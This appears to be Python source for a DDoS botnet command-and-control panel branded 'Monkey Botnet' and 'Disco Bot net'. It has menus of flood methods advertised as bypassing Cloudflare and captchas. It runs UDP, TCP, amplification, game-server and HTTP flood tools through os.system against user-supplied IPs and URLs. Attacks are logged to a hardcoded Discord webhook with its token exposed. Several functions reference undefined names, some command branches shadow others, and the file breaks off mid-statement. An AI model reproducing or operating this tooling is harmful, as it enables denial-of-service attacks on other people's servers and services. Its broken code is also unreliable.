import socket
from datetime import datetime
import os
import curses
import requests
import random
import re
from pystyle import Colors, Colorate, Center
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
import getpass
from colorama import Fore, Back, Style, init
import time
from time import sleep
import sys
users_file = "users.txt"
gradient_box = "\033[48;2;123;0;255m"
MAX_ATTEMPTS = 3
####print("please wait.")
time.sleep(0.3)
os.system("cls" if os.name == "nt" else "clear")
##print(f"Welcome To Disco Bot net | Login Screen")
##print("please wait..")
time.sleep(0.3)
os.system("cls" if os.name == "nt" else "clear")
##print(f"Welcome To Disco Bot net | Login Screen")
##print("please wait...")
##print("Slide onto our Botnet")
ip= requests.get('https://api.ipify.org').text.strip()
try:
    # Count lines in proxy.txt and assign to 'online'
    with open("proxy.txt", "r") as f:
        online = len(f.readlines())
except FileNotFoundError:
    print("Error: proxy.txt not found.")
    online = 0

def get_bot_count():
    try:
        with open("proxy.txt", "r") as f:
            bots = f.readlines()
        return len(bots)
    except FileNotFoundError:
        print("Error: proxy.txt not found.")
        return 0


current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
###Help Gif###
def hlp(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "help.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=5),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)
###Attack gif###
def atk(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "atk.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5, 
              speed=1),
    ]
    scenes.append(Scene(effects, 21))

    screen.play(scenes, stop_on_resize=False, repeat=False)
###Method gif###
def mthd(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "methods.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=0.5),
    ]
    scenes.append(Scene(effects, 20))

    screen.play(scenes, stop_on_resize=False, repeat=False)

    WEBHOOK_URL = "https://discord.com/api/webhooks/1304281179620507748/DQ_P7DMkdYTUnhEa35QMIpDUlQuxvAmZDkDGQ5clADPNLhCJ85O-dDKAkL313twV91Bg"

def send_attack_webhook(username, url, port, time):
    embed = {
        "embeds": [
            {
                "title": f"{username} sent a DDoS attack",
                "fields": [
                    {
                        "name": "Target:",
                        "value": f"> {url}",
                        "inline": True
                    },
                    {
                        "name": "Port:",
                        "value": f"> {port}",
                        "inline": True
                    },
                    {
                        "name": "Time:",
                        "value": f"> {time}",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": f"Sent On: {{current_date}}"
                },
                "color": 0xFF0000  # Red color for the embed
            }
        ]
    }
    WEBHOOK_URL = "https://discord.com/api/webhooks/1304281179620507748/DQ_P7DMkdYTUnhEa35QMIpDUlQuxvAmZDkDGQ5clADPNLhCJ85O-dDKAkL313twV91Bg"
    
    response = requests.post(WEBHOOK_URL, json=embed)
    if response.status_code == 204:
        print("All bots Sent!")
    else:
        print(f"Failed to send webhook: {response.status_code}")

# Function to log when a user logs in
def log_user_login(uname):
    embed = {
        "title": "User Logged into CNC",
        "description": f"{uname} has logged into Disco Botnet",
        "color": 5814783  # Purple color for login
    }
    send_webhook(embed)

# Function to log when a command is used
def log_command_usage(uname):
    embed = {
        "title": "Command Ran on Disco",
        "description": f"{uname} ran a command on Disco. The command has already been sent out to them!",
        "color": 5814783  # Purple color for general commands
    }
    send_webhook(embed)

# Function to log when an attack command is used
def log_attack_command(uname, ip, port, time):
    embed = {
        "title": "Attack Command Ran",
        "description": f"{uname} ran an attack command",
        "color": 16711680,  # Red color for attack commands
        "fields": [
            {"name": "Target", "value": target, "inline": True},
            {"name": "Port", "value": port, "inline": True},
            {"name": "Time", "value": time, "inline": True}
        ]
    }
    send_webhook(embed)



    

###COPYRIGHT tool###
def si():
    print('       \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m*  LIVE |  \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mMonkey Botnet \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mL4/L4 Power \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233m')

###My ip####
def get_info_from_url(url):
    # Extract domain and path from the full URL
    match = re.match(r"https?://([^/]+)(/.*)?", url)
    if match:
        domain = match.group(1)
        path = match.group(2) if match.group(2) else "/"

        print(f"Domain: {domain}, Path: {path}")  # Debugging: Show the extracted domain and path
        
        try:
            # Resolve the URL to an IP address (domain only, ignore path)
            print(f"Resolving Domain: {domain}")  # Debugging: Show the domain being resolved
            ip = socket.gethostbyname(domain)
            print(f"Resolved IP: {ip}")  # Debugging: Show the resolved IP
        except socket.gaierror:
            return None, None, "Error: Unable to resolve the URL"

        try:
            # Use the ipinfo.io API to fetch details about the IP
            response = requests.get(f"https://ipinfo.io/{ip}/json")  # ipinfo.io API endpoint
            data = response.json()

            # Debugging: Show the response data
            print(f"IP Info Response: {data}")

            # Extract ASN, ORG, COUNTRY from the response data
            asn = data.get('org', 'N/A')
            org = asn.split(" ")[-1]  # Extract organization from ASN string
            country = data.get('country', 'N/A')

            return asn, org, country, path
        except requests.exceptions.RequestException as e:
            return None, None, f"Error fetching IP info: {e}", path
    else:
        return None, None, "Error: Invalid URL format", None
###Account###
def account(username):
    print(f"""\x1b[0mID: \x1b[38;2;255;0;255mUnknown\x1b[0m
\x1b[0mUsername: \x1b[38;2;255;0;255m{username}
\x1b[0mBots: \x1b[38;2;255;0;255m{online}
\x1b[0mAdmin: true
\x1b[0mReseller: true
\x1b[0mVIP: true
\x1b[0mBypass Blacklist: true

\x1b[0mExpiry: \x1b[38;2;255;0;255m30\x1b[0m Day(s)
\x1b[0mMaxTime: \x1b[38;2;255;0;255m99999 \x1b[0mSeconds
\x1b[0mCooldown: \x1b[38;2;255;0;255m0\x1b[0m Seconds
\x1b[0mConcurrents: \x1b[38;2;255;0;255m1\x1b[0m
\x1b[0mMax Sessions: \x1b[38;2;255;0;255m4\x1b[0m
\x1b[0mMy Attacks Sent: \x1b[38;2;255;0;255mUnknow\x1b[0m
\x1b[0mCurrent IPv4: \x1b[38;2;255;0;255m{ip}\x1b[0m""")


###help###
def help():
    Screen.wrapper(hlp)
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""\x1b[38;2;255;0;255m         ╦  ╦\x1b[38;2;237;18;255m╦ ╦\x1b[38;2;219;36;255m╦╔╦╗\x1b[38;2;201;54;255m╔╗╔\x1b[38;2;183;72;255m╔═╗
         \x1b[38;2;255;0;255m╚╗╔╝\x1b[38;2;237;18;255m╠═╣\x1b[38;2;219;36;255m║║║║\x1b[38;2;201;54;255m║║║\x1b[38;2;183;72;255m╚═╗
          \x1b[38;2;255;0;255m╚╝ \x1b[38;2;237;18;255m╩ ╩\x1b[38;2;219;36;255m╩ ╩\x1b[38;2;201;54;255m╝╚╝\x1b[38;2;183;72;255m╚═╝
                      \x1b[38;2;255;0;255mDisco \x1b[38;2;115;255;248miu<3 \x1b[1;31mLapoo&.
           \x1b[38;2;255;0;255m \x1b[38;2;250;5;255m \x1b[38;2;245;10;255m╔\x1b[38;2;240;15;255m═\x1b[38;2;235;20;255m═\x1b[38;2;230;25;255m═\x1b[38;2;225;30;255m═\x1b[38;2;220;35;255m═\x1b[38;2;215;40;255m═\x1b[38;2;210;45;255m═\x1b[38;2;205;50;255m═\x1b[38;2;200;55;255m═\x1b[38;2;195;60;255m═\x1b[38;2;190;65;255m═\x1b[38;2;185;70;255m═\x1b[38;2;180;75;255m═\x1b[38;2;175;80;255m═\x1b[38;2;170;85;255m╦\x1b[38;2;165;90;255m═\x1b[38;2;160;95;255m═\x1b[38;2;155;100;255m═\x1b[38;2;150;105;255m═\x1b[38;2;145;110;255m═\x1b[38;2;140;115;255m═\x1b[38;2;135;120;255m═\x1b[38;2;130;125;255m═\x1b[38;2;125;130;255m═\x1b[38;2;120;135;255m═\x1b[38;2;115;140;255m═\x1b[38;2;110;145;255m═\x1b[38;2;105;150;255m═\x1b[38;2;100;155;255m═\x1b[38;2;95;160;255m═\x1b[38;2;90;165;255m═\x1b[38;2;85;170;255m═\x1b[38;2;80;175;255m═\x1b[38;2;75;180;255m═\x1b[38;2;70;185;255m═\x1b[38;2;65;190;255m═\x1b[38;2;60;195;255m═\x1b[38;2;55;200;255m═\x1b[38;2;50;205;255m═\x1b[38;2;45;210;255m═\x1b[38;2;40;215;255m═\x1b[38;2;35;220;255m═\x1b[38;2;30;225;255m═\x1b[38;2;25;230;255m╗\x1b[38;2;20;235;255m
           \x1b[38;2;255;0;255m╔\x1b[38;2;250;5;255m═\x1b[38;2;245;10;255m╣   \x1b[1;37mCOMMANDS   \x1b[38;2;170;85;255m║         \x1b[1;37mDESCRIPTION        \x1b[38;2;25;230;255m╠\x1b[38;2;20;235;255m═\x1b[38;2;15;240;255m╗\x1b[38;2;10;245;255m
           \x1b[38;2;255;0;255m║\x1b[1;37mH\x1b[38;2;245;10;255m╠\x1b[38;2;240;15;255m═\x1b[38;2;235;20;255m═\x1b[38;2;230;25;255m═\x1b[38;2;225;30;255m═\x1b[38;2;220;35;255m═\x1b[38;2;215;40;255m═\x1b[38;2;210;45;255m═\x1b[38;2;205;50;255m═\x1b[38;2;200;55;255m═\x1b[38;2;195;60;255m═\x1b[38;2;190;65;255m═\x1b[38;2;185;70;255m═\x1b[38;2;180;75;255m═\x1b[38;2;175;80;255m═\x1b[38;2;170;85;255m╬\x1b[38;2;165;90;255m═\x1b[38;2;160;95;255m═\x1b[38;2;155;100;255m═\x1b[38;2;150;105;255m═\x1b[38;2;145;110;255m═\x1b[38;2;140;115;255m═\x1b[38;2;135;120;255m═\x1b[38;2;130;125;255m═\x1b[38;2;125;130;255m═\x1b[38;2;120;135;255m═\x1b[38;2;115;140;255m═\x1b[38;2;110;145;255m═\x1b[38;2;105;150;255m═\x1b[38;2;100;155;255m═\x1b[38;2;95;160;255m═\x1b[38;2;90;165;255m═\x1b[38;2;85;170;255m═\x1b[38;2;80;175;255m═\x1b[38;2;75;180;255m═\x1b[38;2;70;185;255m═\x1b[38;2;65;190;255m═\x1b[38;2;60;195;255m═\x1b[38;2;55;200;255m═\x1b[38;2;50;205;255m═\x1b[38;2;45;210;255m═\x1b[38;2;40;215;255m═\x1b[38;2;35;220;255m═\x1b[38;2;30;225;255m═\x1b[38;2;25;230;255m╣\x1b[1;37mM\x1b[38;2;15;240;255m║
           \x1b[38;2;255;0;255m║\x1b[1;37mE\x1b[38;2;245;10;255m║ \x1b[1;37mMETHODS      \x1b[38;2;170;85;255m║ \x1b[1;32mAvailable Method Pages     \x1b[38;2;25;230;255m║\x1b[1;37mE\x1b[38;2;15;240;255m║
           \x1b[38;2;255;0;255m║\x1b[1;37mL\x1b[38;2;245;10;255m║ \x1b[1;37mACCOUNT      \x1b[38;2;170;85;255m║ \x1b[1;32mAccount Infomation         \x1b[38;2;25;230;255m║\x1b[1;37mN\x1b[38;2;15;240;255m║
           \x1b[38;2;255;0;255m║\x1b[1;37mP\x1b[38;2;245;10;255m║ \x1b[1;37mMYIP         \x1b[38;2;170;85;255m║ \x1b[1;32mShow Your IP               \x1b[38;2;25;230;255m║\x1b[1;37mU\x1b[38;2;15;240;255m║
           \x1b[38;2;255;0;255m╚\x1b[38;2;192;63;255m═\x1b[38;2;245;10;255m╣ \x1b[1;37mCLEAR        \x1b[38;2;170;85;255m║ \x1b[1;32mBack To Main Page          \x1b[38;2;25;230;255m╠\x1b[38;2;20;235;255m═\x1b[38;2;15;240;255m╝
           \x1b[38;2;255;0;255m \x1b[38;2;192;63;255m \x1b[38;2;245;10;255m║ \x1b[1;37mADMIN        \x1b[38;2;170;85;255m║ \x1b[1;32mAdmin Infomation           \x1b[38;2;25;230;255m║
           \x1b[38;2;255;0;255m \x1b[38;2;192;63;255m \x1b[38;2;245;10;255m║ \x1b[1;37mDISCORD      \x1b[38;2;170;85;255m║ \x1b[1;32mDiscord Server Link        \x1b[38;2;25;230;255m║
           \x1b[38;2;255;0;255m \x1b[38;2;250;5;255m \x1b[38;2;245;10;255m╚\x1b[38;2;240;15;255m═\x1b[38;2;235;20;255m═\x1b[38;2;230;25;255m═\x1b[38;2;225;30;255m═\x1b[38;2;220;35;255m═\x1b[38;2;215;40;255m═\x1b[38;2;210;45;255m═\x1b[38;2;205;50;255m═\x1b[38;2;200;55;255m═\x1b[38;2;195;60;255m═\x1b[38;2;190;65;255m═\x1b[38;2;185;70;255m═\x1b[38;2;180;75;255m═\x1b[38;2;175;80;255m═\x1b[38;2;170;85;255m╩\x1b[38;2;165;90;255m═\x1b[38;2;160;95;255m═\x1b[38;2;155;100;255m═\x1b[38;2;150;105;255m═\x1b[38;2;145;110;255m═\x1b[38;2;140;115;255m═\x1b[38;2;135;120;255m═\x1b[38;2;130;125;255m═\x1b[38;2;125;130;255m═\x1b[38;2;120;135;255m═\x1b[38;2;115;140;255m═\x1b[38;2;110;145;255m═\x1b[38;2;105;150;255m═\x1b[38;2;100;155;255m═\x1b[38;2;95;160;255m═\x1b[38;2;90;165;255m═\x1b[38;2;85;170;255m═\x1b[38;2;80;175;255m═\x1b[38;2;75;180;255m═\x1b[38;2;70;185;255m═\x1b[38;2;65;190;255m═\x1b[38;2;60;195;255m═\x1b[38;2;55;200;255m═\x1b[38;2;50;205;255m═\x1b[38;2;45;210;255m═\x1b[38;2;40;215;255m═\x1b[38;2;35;220;255m═\x1b[38;2;30;225;255m═\x1b[38;2;25;230;255m╝\x1b[0;00m
""")
####Methods####
def display_loading_message():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\n\nLoading Methods Page....")
    time.sleep(2)  # Simulate loading time

def show_methods_page():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
 * type "l7basic" to open Layer 7 Basic Page
 * type "l7vip" to open Layer 7 VIP page
""")

def show_layer_7_basic_page():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
[ Layer 7 Basic ]
-------------------
* "httpsbypass" ...... Custom flood that does high RQ/s & bypasses custom protection
* "httpsv2" .......... Flood made for bypassing Cloudflare/UAM with cookies & headers, bypasses custom js protection and others
* "tls" .......... Custom flood that does high RQ/s & bypasses custom protection
"browser" .......... Flood made for bypassing Cloudflare/UAM/Google Captcha with cookies
""")

def show_layer_7_vip_page():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
[ Layer 7 Vip ]
-------------------
* "https-cloudflare" ...... Custom flood that does high RQ/s & bypasses custom protection
* "tlsv2" .......... Flood made for bypassing Cloudflare/UAM with cookies & headers, bypasses custom js protection and others
""")

# Initialize colorama
init(autoreset=True)

def meth(username):
    os.system('cls' if os.name == 'nt' else 'clear')
    Screen.wrapper(mthd)

    lines = [
        f"{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════╗╔══════════════════════╗",
        f"{Fore.GREEN}║     [  HTTPS  ]                                                       ║║ ⠰⠾⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠧ ║",
        f"{Fore.CYAN}║   [L7] .httpsbypass  <target> <port> <time>  Requirements:  (VIP)    ║║ ⠿⠭⠍ ⠉⠽⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.CYAN}║   [L7] .http-xv      <target> <port> <time>  Requirements:  (VIP)    ║║ ⠿⠿⠵⠾⠦⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.CYAN}║   [L7] .https-basic     <target> <port> <time>  Requirements:  (VIP)    ║║ ⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.CYAN}║   [L7] .http-browser  <target> <port> <time>  Requirements:  (VIP)    ║║ ⠿⠿⠿⠿⠿⠿⠿⠿⠉⠉⠿⠿⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.CYAN}║   [L7] .http         <target> <port> <time>  Requirements:  (NORMAL) ║║ ⠿⠿⠿⠿⠿⠿ ⠿⠿⠿⠿ ⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.GREEN}║     [  UDP  ]                                                        ║║ ⠿⠿⠿⠿⠿⠿ ⠿⠿ ⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.CYAN}║   [L4] .udp-bypass   <target> <port> <time>  Requirements:  (VIP)    ║║ ⠿⠿⠿⠿⠿⠿ ⠿⠿ ⠷⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.CYAN}║   [L4] .udp-game     <target> <port> <time>  Requirements:  (VIP)    ║║ ⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿        ⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.CYAN}║   [L4] .udp-gbps     <target> <port> <time>  Requirements:  (NORMAL) ║║ ⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.GREEN}║     [  TCP  ]                                                        ║║ ⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠙⠟⠫⠿⠿ ║",
        f"{Fore.CYAN}║   [L4] .tcp-bypass   <target> <port> <time>  Requirements:  (VIP)    ║║ ⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠶⠿ ║",
        f"{Fore.CYAN}║   [L4] .syn-comb     <target> <port> <time>  Requirements:  (VIP)    ║║ ⠘⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿ ║",
        f"{Fore.CYAN}║   [L4] .ack-xv       <target> <port> <time>  Requirements:  (NORMAL) ║║ ╔══════════════════╗ ║",
        f"{Fore.GREEN}║     [  OTHER  ]                                                      ║║ ║ Monkey [/] Methods ║ ║",
        f"{Fore.CYAN}║   [L4] .discord       <target> <port> <time>  Requirements:  (VIP)   ║║ ║                  ║ ║",
        f"{Fore.CYAN}║   [L4] .100up         <target> <port> <time>  Requirements:  (VIP)   ║║ ║ Network Status:  ║ ║",
        f"{Fore.CYAN}║   [L4] .mw-cod        <target> <port> <time>  Requirements:  (VIP)   ║║ ║  [L7] • online   ║ ║",
        f"{Fore.CYAN}║   [L4] .bo6-cod       <target> <port> <time>  Requirements:  (VIP)   ║║ ║  [L4] • online   ║ ║",
        f"{Fore.CYAN}║   [L4] .fortnite      <target> <port> <time>  Requirements:  (VIP)   ║║ ║  [LE] • online   ║ ║",
        f"{Fore.GREEN}║     [  BYPASS  ]                                                     ║║ ║  [XX] • offline  ║ ║",
        f"{Fore.CYAN}║   [L4] .soon...       <target> <port> <time>  Requirements:  (VIP)   ║║ ║                  ║ ║",
        f"{Fore.CYAN}║   [L4] .soon...       <target> <port> <time>  Requirements:  (VIP)   ║║ ║   ( Pages )      ║ ║",
        f"{Fore.CYAN}║   [L4] .soon...       <target> <port> <time>  Requirements:  (VIP)   ║║ ║  [LE] MONKEY       ║ ║",
        f"{Fore.CYAN}║   [L4] .soon...       <target> <port> <time>  Requirements:  (VIP)   ║║ ║  [xv] MAIN       ║ ║",
        f"{Fore.CYAN}║   [L4] .soon...       <target> <port> <time>  Requirements:  (VIP)   ║║ ║                  ║ ║",
        f"{Fore.GREEN}╠══════════════════════════════════════════════════════════════════════╣║ ║   (MONKEY OGS)     ║ ║",
        f"{Fore.GREEN}║     [   RAW   ]                                                      ║║ ║  [kuma & neoserver]         ║ ║",
        f"{Fore.CYAN}║   [L4] .http-raw      <target> <port> <time>   Requirements:  (RAW)   ║║ ║  [tom]       ║ ║",
        f"{Fore.CYAN}║   [L4] .soon...      <target> <port> <time>   Requirements:  (RAW)   ║║ ║  [Cone]          ║ ║",
        f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════════╝╚══════════════════════╝"
    ]
    
    # Print all lines
    for line in lines:
        print(line)


    
def count_users():
    """
    Count the total number of users in users.txt.
    """
    try:
        with open("users.txt", "r") as file:
            users = file.readlines()
            return len(users)
    except FileNotFoundError:
        print("❌ [ERROR] users.txt file not found.")
        return 0

def get_user_expiry(username):
    """
    Retrieve the expiry date of the given username from users.txt.
    """
    try:
        with open("users.txt", "r") as file:
            for line in file:
                line = line.strip()
                parts = line.split(":")
                if len(parts) >= 3 and parts[0] == username:
                    return parts[2]  # Return the expiry date
    except FileNotFoundError:
        print("❌ [ERROR] users.txt file not found.")
        return "Unknown"
    return "Unknown"

def update_title_bar(username):
    """
    Update the terminal title bar with dynamic information.
    """
    users_online = count_users()
    expiry_date = get_user_expiry(username)

    # Calculate days left until expiry
    try:
        expiry_datetime = datetime.strptime(expiry_date, "%m/%d/%y")
        days_left = (expiry_datetime - datetime.now()).days
    except ValueError:
        days_left = "Unknown"

    # Update the terminal title bar
    sys.stdout.write(
        f"\x1b]2;| Users Online [ {users_online} ] | Logged In As [ {username} ] | Expires In [ {days_left} ] Day(s)\x07"
    )

def menu(username):
    ##sys.stdout.write(f"\x1b]2;[-] | Disco Bot Net ̊ॱ User: {uname} ̊ॱ Running 0/10 ̊ॱ  Bots {online}\x07")
    os.system('cls' if os.name == 'nt' else 'clear')
    si()
    
    print(f"""
\x1b[38;2;115;255;248m                          __,__
\x1b[38;2;115;255;248m                 .--.  .-"     "-.  .--.
\x1b[38;2;115;255;248m                / .. \\/  .-. .-.  \\/ .. \\
\x1b[38;2;115;255;248m               | |  '|  /   Y   \\  |'  | |
\x1b[38;2;115;255;248m               | \\   \\  \\ 0 | 0 /  /   / |
\x1b[38;2;115;255;248m                \\ '- ,\\.-\\""-./, -' /
\x1b[38;2;115;255;248m                 `'-' /_   ^ ^    ^   _\\ '-'`
\x1b[38;2;115;255;248m                 .--'|  \\._     _./  |'--.
\x1b[38;2;115;255;248m               /`    \\   \\ '-.-' /   /    `\\
\x1b[38;2;115;255;248m              /       '._     _.'       \\
\x1b[38;2;115;255;248m             /           `""`           \\

\x1b[38;2;255;140;0m╔════════════════════════════════════════════════════════════╗
\x1b[38;2;255;140;0m║                \x1b[38;2;255;255;255mWelcome to \x1b[38;2;255;0;0mMonkey Botnet\x1b[38;2;255;255;255m                 ║
\x1b[38;2;255;140;0m║                  \x1b[38;2;0;255;255mCreated by @kuma                  ║
\x1b[38;2;255;140;0m║              \033[1;4m\x1b[38;2;255;234;0m Made with ❤️ for Best L4/L7               \033[0m║
\x1b[38;2;255;140;0m╚════════════════════════════════════════════════════════════╝

\x1b[38;2;249;6;255m╔════════════════════════════════════════════════════════════╗
\x1b[38;2;249;6;255m║            \x1b[38;2;239;239;239mType "[methods]" To See All Methods!            ║
\x1b[38;2;249;6;255m╚════════════════════════════════════════════════════════════╝

\x1b[38;2;115;255;248m║               \x1b[38;2;0;113;133mDiscord:\x1b[38;2;239;239;239m [discord.gg/monkeycnc]               ║

\x1b[38;2;255;140;0m╔════════════════════════════════════════════════════════════╗
\x1b[38;2;255;140;0m║         \x1b[38;2;239;239;239mCopyright © 2024-2025 By \x1b[38;2;0;221;255mkuma             ║
\x1b[38;2;255;140;0m╚════════════════════════════════════════════════════════════╝
""")

    


def main(username):
    menu(username)  # Assuming this function is defined elsewhere
    while True:
        gradient_box = "\033[48;2;0;123;255m"
        username_gradient = f"{gradient_box}\033[38;2;0;0;0m {username} \u25CF monkey ⯈⯈ \033[0m"
        cnc = input(username_gradient + " ")
        # Example gradient box and username gradient
        if cnc == "METHODS" or cnc == "methods" or cnc == "Methods":
            meth(username)
        elif cnc == "CLEAR" or cnc == "clear" or cnc == "cls":
            main(username)
        elif cnc == "adduser" or cnc == "user" or cnc == "add":
            admin()
        elif cnc in ["CHAT", "chat", "Chat"]:
            #import os
            import time

            chat_file = "chat_log.txt"

            # Ensure the chat file exists
            if not os.path.exists(chat_file):
                with open(chat_file, "w") as f:
                    f.write("=== Chat Started ===\n")

            print("\n\033[92mYou've joined the Chat\033[0m")
            print("Type your messages below. Type '\033[91mexit\033[0m' to leave the chat.\n")

            def read_chat():
                """Continuously read and display new messages."""
                with open(chat_file, "r") as f:
                    f.seek(0, os.SEEK_END)  # Move to the end of the file
                    while chat_active:
                        line = f.readline()
                        if line:
                            print(line.strip())
                        else:
                            time.sleep(0.5)

            chat_active = True

            # Start a thread to read messages in real time
            from threading import Thread
            reader_thread = Thread(target=read_chat)
            reader_thread.start()

            # Write user messages to the file
            while chat_active:
                try:
                    message = input("> ")
                    if message.lower() == "exit":
                        print("\033[91mExiting the Chat...\033[0m\n")
                        chat_active = False
                        break
                    with open(chat_file, "a") as f:
                        f.write(f"\033[94m{username} typed a message\033[0m\n> \033[93m{message}\033[0m\n")
                except KeyboardInterrupt:
                    print("\033[91mExiting the Chat...\033[0m\n")
                    chat_active = False
                    break

            reader_thread.join()  # Ensure the reader thread stops
        elif cnc == "ACCOUNT" or cnc == "Account" or cnc == "account":
            account(username)
        elif cnc == "HELP" or cnc == "Help" or cnc == "help":
            help()
        elif cnc =="DISCORD" or cnc == "Discord" or cnc == "discord":
            print("\x1b[38;2;0;255;255mhttps://discord.gg/UJRfjYE7Nn")
        elif cnc =="ADMIN" or cnc == "Admin" or cnc == "admin":
            admin()
        
        #####L4####
        elif "udp" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"python ./data/udp.py {ip} {port} 0 0")
            except IndexError:
                print("Usage : udp <ip> <port>")
                print("Example : udp 1.1.1.1 80")
        elif "tcp" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                method=cnc.split()[3]
                time=cnc.split()[4]
                conns=cnc.split()[5]
                os.system(f"./data/100UP-TCP {method} {ip} {port} {time} {conns}")
            except IndexError:
                print("Usage : tcp <ip> <port> <GET/POST/HEAD> <time> <connections>")
                print("Example : tcp 1.1.1.1 80 GET 60 9000")
        elif "udpbypass" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"./data/UDPBYPASS {ip} {port}")
            except IndexError:
                print("Usage : udpbypass <ip> <port>")
                print("Example : udpbypass 8.8.8.8 80")
        elif "std" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"./data/STD-NOSPOOF {ip} {port}")
            except IndexError:
                print("Usage : std <ip> <port>")
                print("Example : std 8.8.4.4 443")
        elif "std-v2" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"./data/std {ip} {port}")
            except IndexError:
                print("Usage : std-v2 <ip> <port>")
                print("Example : std-v2 1.1.1.1 80")
        elif "minecraft" in cnc:
            try:
                ip=cnc.split()[1]
                throttle=cnc.split()[2]
                threads=cnc.split()[3]
                time=cnc.split()[4]
                os.system(f"./data/MINECRAFT-SLAM {ip} {threads} {time}")
            except IndexError:
                print("Usage : minecraft <ip> <throttle> <threads> <time>")
                print("Example : minecraft 1.1.1.1 5000 500 60")
        elif "home" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                psize=cnc.split()[3]
                time=cnc.split()[4]
                os.system(f"perl ./data/home.pl {ip} {port} {psize} {time}")
            except IndexError:
                print("Usage : home <ip> <port> <packet_size> <time>")
                print("Example : home 1.1.1.1 80 65000 60")
        elif "samp" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"python3 ./data/samp.py {ip} {port}")
            except IndexError:
                print("Usage : samp <ip> <port>")
                print("Example : samp 1.1.1.1 7777")
        elif "ovh-amp" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                os.system(f"./data/OVH-AMP {ip} {port}")
            except IndexError:
                print("Usage : ovh-amp <ip> <port>")
                print("Example : ovh-amp 1.1.1.1 80")
        elif "nfo" in cnc:
            try:
                ip=cnc.split()[1]
                port=cnc.split()[2]
                threads=cnc.split()[3]
                time=cnc.split()[4]
                os.system(f"./data/nfo-killer {ip} {port} {threads} -1 {time}")
            except IndexError:
                print("Usage : nfo <ip> <port> <threads> <time>")
                print("Example : nfo 1.1.1.1 80 850 120")
        elif "fivem" in cnc:
                print("Methods [fivem] not Enable ...")
                
            #######L7######
        elif "http-raw" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                os.system(f"node ./data/HTTP-RAW.js {url} {time}")
                os.system('cls' if os.name == 'nt' else 'clear')
                send_attack_webhook(uname, url, port, time)
            except IndexError:
                print("Usage : http-raw <url> <port> <time>")
                print("Example : http-raw https://github.com/ 443 60")
        elif "touch-gorilla" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
